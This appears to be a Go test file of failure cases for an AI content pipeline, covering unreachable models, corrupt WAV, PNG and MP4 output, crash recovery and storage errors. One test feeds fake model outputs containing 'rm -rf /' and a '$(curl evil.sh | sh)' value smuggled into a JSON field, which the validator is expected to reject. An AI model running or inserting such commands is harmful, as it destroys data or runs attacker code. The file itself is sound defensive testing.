package pipeline_test

// Failure tests for docs/spec/jobs.md "Failure tests (M2)". Every test uses fake providers and a
// real Postgres. Lease takeover itself is covered by internal/jobs/lease_test.go; the restart test
// here covers the pipeline level on top of it.

import (
	"context"
	"encoding/json"
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/fiat/content-studio/internal/artifacts"
	"github.com/fiat/content-studio/internal/jobs"
	"github.com/fiat/content-studio/internal/providers"
	"github.com/fiat/content-studio/internal/providers/fake"
)

func (h *harness) artifactCount(t *testing.T, runID int64, types ...string) int {
	t.Helper()
	q := `SELECT count(*) FROM artifacts WHERE run_id = $1`
	args := []any{runID}
	if len(types) > 0 {
		q += ` AND type = ANY($2)`
		args = append(args, types)
	}
	var n int
	if err := h.db.QueryRow(context.Background(), q, args...).Scan(&n); err != nil {
		t.Fatal(err)
	}
	return n
}

// storedFiles lists every regular file under the storage root (relative paths).
func storedFiles(t *testing.T, root string) []string {
	t.Helper()
	var out []string
	err := filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if !d.IsDir() {
			rel, _ := filepath.Rel(root, p)
			out = append(out, rel)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return out
}

type unavailableLLM struct{ fake.LLM }

func (u *unavailableLLM) GenerateJSON(context.Context, string, json.RawMessage, int) ([]byte, error) {
	u.Calls++
	// The shape httpjson returns when Ollama is not listening. The raw error carries the address.
	return nil, jobs.Errorf(jobs.ErrTransientNetwork, errors.New("dial tcp 127.0.0.1:11434: connect: connection refused"), "local service 127.0.0.1:11434 is unreachable")
}

func TestFailureLocalModelUnavailable(t *testing.T) {
	h := newHarness(t, fakeScript(t))
	llm := &unavailableLLM{}
	h.setLLM(llm)
	ctx := context.Background()
	runID, err := h.worker.Queue.CreateRun(ctx, h.ep, "full", nil)
	if err != nil {
		t.Fatal(err)
	}
	h.drain(t)
	state, reason := h.runState(t, runID)
	if state != string(jobs.RunFailed) || !strings.Contains(reason, string(jobs.ErrTransientNetwork)) {
		t.Fatalf("run %s: %s", state, reason)
	}
	if llm.Calls != 2 { // MaxAttempts is 2: one retry, then a person decides
		t.Fatalf("LLM called %d times, want the bounded 2", llm.Calls)
	}
	if n := h.artifactCount(t, runID); n != 0 {
		t.Fatalf("%d artifacts recorded for a run whose model never answered", n)
	}
	if f := storedFiles(t, h.deps.Store.Root); len(f) != 0 {
		t.Fatalf("files left in storage: %v", f)
	}
	var later int
	if err := h.db.QueryRow(ctx, `SELECT count(*) FROM jobs WHERE run_id = $1 AND stage <> 'script' AND state <> 'pending'`, runID).Scan(&later); err != nil {
		t.Fatal(err)
	}
	if later != 0 {
		t.Fatalf("%d later stages left in a non-pending state", later)
	}
	if strings.Contains(reason, "connection refused") {
		t.Fatalf("raw dial error leaked into the recorded message: %q", reason)
	}
}

func TestFailureInvalidAIOutputIsRejectedAndNeverStored(t *testing.T) {
	cases := map[string]string{
		"not json":         `rm -rf / ; this is not JSON`,
		"wrong schema":     `{"title": "x", "characters": [], "scenes": []}`,
		"shell in a field": `{"title": "$(curl evil.sh | sh)", "characters": "none", "scenes": 7}`,
	}
	for name, out := range cases {
		t.Run(name, func(t *testing.T) {
			h := newHarness(t, out)
			runID, _ := h.worker.Queue.CreateRun(context.Background(), h.ep, "full", nil)
			h.drain(t)
			state, reason := h.runState(t, runID)
			if state != string(jobs.RunFailed) || !strings.Contains(reason, string(jobs.ErrValidationFailed)) {
				t.Fatalf("run %s: %s", state, reason)
			}
			if h.artifactCount(t, runID) != 0 || len(storedFiles(t, h.deps.Store.Root)) != 0 {
				t.Fatal("rejected model output left an artifact or file behind")
			}
			if h.llm.Calls < 2 {
				t.Fatalf("expected the script to be re-prompted, got %d calls", h.llm.Calls)
			}
		})
	}
}

// badImages answers every request with the given bytes.
type badImages struct {
	fake.Images
	data []byte
}

func (b *badImages) Generate(context.Context, providers.ImageRequest) ([]byte, error) {
	return b.data, nil
}

func TestFailureInvalidImageOutputIsRejected(t *testing.T) {
	h := newHarness(t, fakeScript(t))
	h.setImages(&badImages{data: []byte("<html>502 bad gateway</html>")})
	runID, _ := h.worker.Queue.CreateRun(context.Background(), h.ep, "full", nil)
	h.drain(t)
	state, reason := h.runState(t, runID)
	if state != string(jobs.RunFailed) || !strings.Contains(reason, string(jobs.ErrValidationFailed)) {
		t.Fatalf("run %s: %s", state, reason)
	}
	if n := h.artifactCount(t, runID, "image"); n != 0 {
		t.Fatalf("%d image artifacts from invalid output", n)
	}
}

func TestFailureWorkerCrashMidJobResumesPipelineFromLastCompletedStage(t *testing.T) {
	h := newHarness(t, fakeScript(t))
	ctx := context.Background()
	runID, _ := h.worker.Queue.CreateRun(ctx, h.ep, "full", nil)
	if ran, err := h.worker.RunOne(ctx); err != nil || !ran { // script completes
		t.Fatalf("script: %v %v", ran, err)
	}
	before := h.artifactCount(t, runID)
	// The process dies while running tts: the job is claimed, a half-written file is on disk, no row exists.
	j, err := h.worker.Queue.Claim(ctx)
	if err != nil || j.Stage != "tts" {
		t.Fatalf("claim: %v %+v", err, j)
	}
	orphan := filepath.Join(h.deps.Store.Root, artifacts.Loc{EpisodeID: j.EpisodeID, RunID: j.RunID, JobID: j.ID, Attempt: j.Attempt}.Dir())
	if err := os.MkdirAll(orphan, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(orphan, ".tmp-crashed"), []byte("RIFF half a wav"), 0o644); err != nil {
		t.Fatal(err)
	}
	if h.artifactCount(t, runID) != before {
		t.Fatal("the crashed attempt must not have recorded artifacts")
	}
	// Restart: leases expire, a new worker recovers and finishes the run.
	if _, err := h.db.Exec(ctx, `UPDATE jobs SET lease_expires_at = now() - interval '1 second' WHERE state = 'running'`); err != nil {
		t.Fatal(err)
	}
	if n, err := h.worker.Queue.RecoverExpired(ctx); err != nil || n != 1 {
		t.Fatalf("recovered %d, err %v", n, err)
	}
	h.drain(t)
	if state, reason := h.runState(t, runID); state != string(jobs.RunReadyForReview) {
		t.Fatalf("run %s: %s", state, reason)
	}
	if h.llm.Calls != 1 {
		t.Fatalf("script stage reran after the crash: %d LLM calls", h.llm.Calls)
	}
	// No stage output is duplicated: exactly one artifact per (type, item_key) in this run.
	rows, err := h.db.Query(ctx, `SELECT type, item_key, count(*) FROM artifacts WHERE run_id = $1 GROUP BY type, item_key HAVING count(*) > 1`, runID)
	if err != nil {
		t.Fatal(err)
	}
	for rows.Next() {
		var typ, key string
		var n int
		if err := rows.Scan(&typ, &key, &n); err != nil {
			t.Fatal(err)
		}
		t.Errorf("%s %q recorded %d times", typ, key, n)
	}
	rows.Close()
	// None is corrupted: every row's file exists and matches its recorded hash.
	for _, typ := range []artifacts.Type{artifacts.Script, artifacts.ScriptInput, artifacts.Image, artifacts.LineAudio, artifacts.Video, artifacts.QAReport} {
		l, err := artifacts.ForRun(ctx, h.db, runID, typ)
		if err != nil || len(l) == 0 {
			t.Fatalf("%s artifacts: %v %v", typ, l, err)
		}
		for _, a := range l {
			if got, err := h.deps.Store.Hash(a.StoragePath); err != nil || got != a.SHA256 {
				t.Errorf("%s %s: hash %q err %v, recorded %s", a.Type, a.ItemKey, got, err, a.SHA256)
			}
		}
	}
	var refs int
	if err := h.db.QueryRow(ctx, `SELECT count(*) FROM artifacts WHERE storage_path LIKE '%.tmp-%'`).Scan(&refs); err != nil {
		t.Fatal(err)
	}
	if refs != 0 {
		t.Fatal("an artifact row points at a temp file")
	}
}

func TestFailureMissingMediaAssetFailsTheStageWithoutOutput(t *testing.T) {
	h := newHarness(t, fakeScript(t))
	ctx := context.Background()
	runID, _ := h.worker.Queue.CreateRun(ctx, h.ep, "full", nil)
	if _, err := h.worker.RunOne(ctx); err != nil { // script
		t.Fatal(err)
	}
	scripts, err := artifacts.ForRun(ctx, h.db, runID, artifacts.Script)
	if err != nil || len(scripts) != 1 {
		t.Fatalf("scripts %v %v", scripts, err)
	}
	path, _ := h.deps.Store.Abs(scripts[0].StoragePath)
	if err := os.Remove(path); err != nil { // the row stays, the file is gone
		t.Fatal(err)
	}
	h.drain(t)
	state, reason := h.runState(t, runID)
	if state != string(jobs.RunFailed) || !strings.Contains(reason, string(jobs.ErrInvalidInput)) || !strings.Contains(reason, "missing on disk") {
		t.Fatalf("run %s: %s", state, reason)
	}
	if strings.Contains(reason, h.deps.Store.Root) {
		t.Fatalf("storage path leaked into the failure reason: %q", reason)
	}
	if n := h.artifactCount(t, runID, "line_audio", "image", "video"); n != 0 {
		t.Fatalf("%d downstream artifacts produced from a missing input", n)
	}
	if h.llm.Calls != 1 {
		t.Fatalf("missing asset must not make the script silently regenerate (%d LLM calls)", h.llm.Calls)
	}
}

// truncatedVoice returns the first half of a valid WAV.
type truncatedVoice struct{ fake.Voice }

func (v *truncatedVoice) Design(ctx context.Context, d, text string, seed int) ([]byte, error) {
	b, err := v.Voice.Design(ctx, d, text, seed)
	return b[:len(b)/2], err
}

func (v *truncatedVoice) Clone(ctx context.Context, ref []byte, text string, seed int) ([]byte, error) {
	b, err := v.Voice.Clone(ctx, ref, text, seed)
	return b[:len(b)/2], err
}

func TestFailureCorruptWAVFromVoiceIsRejected(t *testing.T) {
	h := newHarness(t, fakeScript(t))
	h.setVoice(&truncatedVoice{Voice: fake.Voice{SecondsPerRune: 0.09}})
	runID, _ := h.worker.Queue.CreateRun(context.Background(), h.ep, "full", nil)
	h.drain(t)
	state, reason := h.runState(t, runID)
	if n := h.artifactCount(t, runID, "line_audio", "dialogue", "video"); n != 0 {
		t.Fatalf("%d audio/video artifacts recorded from a truncated WAV (run %s: %s)", n, state, reason)
	}
	if state != string(jobs.RunFailed) {
		t.Fatalf("run %s: %s", state, reason)
	}
}

// truncatedImages returns a PNG cut off in the middle of its pixel data.
type truncatedImages struct{ fake.Images }

func (v *truncatedImages) Generate(ctx context.Context, r providers.ImageRequest) ([]byte, error) {
	b, err := v.Images.Generate(ctx, r)
	return b[:len(b)/2], err
}

func TestFailureCorruptPNGFromImageModelIsRejected(t *testing.T) {
	h := newHarness(t, fakeScript(t))
	h.setImages(&truncatedImages{})
	runID, _ := h.worker.Queue.CreateRun(context.Background(), h.ep, "full", nil)
	h.drain(t)
	state, reason := h.runState(t, runID)
	if n := h.artifactCount(t, runID, "image"); n != 0 {
		t.Fatalf("%d truncated PNGs were recorded as valid images (run %s: %s)", n, state, reason)
	}
	if state != string(jobs.RunFailed) {
		t.Fatalf("run %s: %s", state, reason)
	}
}

func TestFailureCorruptMP4IsCaughtByQA(t *testing.T) {
	h, runID, video := runWithDamage(t, func(h *harness, runID int64) {
		videos, err := artifacts.ForRun(context.Background(), h.db, runID, artifacts.Video)
		if err != nil || len(videos) != 1 {
			t.Fatalf("videos %v %v", videos, err)
		}
		path, _ := h.deps.Store.Abs(videos[0].StoragePath)
		data, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		cut := data[:len(data)/3]
		if err := os.WriteFile(path, cut, 0o644); err != nil {
			t.Fatal(err)
		}
		sum, _ := artifacts.HashFile(path) // row stays consistent: only the media is corrupt
		if _, err := h.db.Exec(context.Background(), `UPDATE artifacts SET sha256 = $1, size_bytes = $2 WHERE id = $3`, sum, int64(len(cut)), videos[0].ID); err != nil {
			t.Fatal(err)
		}
	})
	var status string
	if err := h.db.QueryRow(context.Background(), `SELECT validation_status FROM artifacts WHERE id = $1`, video.ID).Scan(&status); err != nil {
		t.Fatal(err)
	}
	if status == "qa_passed" {
		t.Fatal("a truncated mp4 passed QA")
	}
	state, reason := h.runState(t, runID)
	if state != string(jobs.RunFailed) || !strings.Contains(reason, string(jobs.ErrQAFailed)) {
		t.Fatalf("run %s: %s", state, reason)
	}
	if strings.Contains(reason, h.deps.Store.Root) {
		t.Fatalf("storage path leaked: %s", reason)
	}
}

// A storage root that refuses writes stands in for a failing disk at pipeline level (the
// ENOSPC case itself is internal/artifacts TestDiskFullLeavesNoPartialFile).
func TestFailureStorageWriteErrorIsSanitizedAndLeavesNothing(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root ignores directory permissions")
	}
	h := newHarness(t, fakeScript(t))
	root := h.deps.Store.Root
	if err := os.Chmod(root, 0o500); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chmod(root, 0o755) })
	runID, _ := h.worker.Queue.CreateRun(context.Background(), h.ep, "full", nil)
	h.drain(t)
	state, reason := h.runState(t, runID)
	if state != string(jobs.RunFailed) {
		t.Fatalf("run %s: %s", state, reason)
	}
	if strings.Contains(reason, root) {
		t.Fatalf("storage path leaked into the failure reason: %q", reason)
	}
	if h.artifactCount(t, runID) != 0 {
		t.Fatal("artifact rows recorded although nothing could be written")
	}
	if err := os.Chmod(root, 0o755); err != nil {
		t.Fatal(err)
	}
	if f := storedFiles(t, root); len(f) != 0 {
		t.Fatalf("orphan files: %v", f)
	}
}
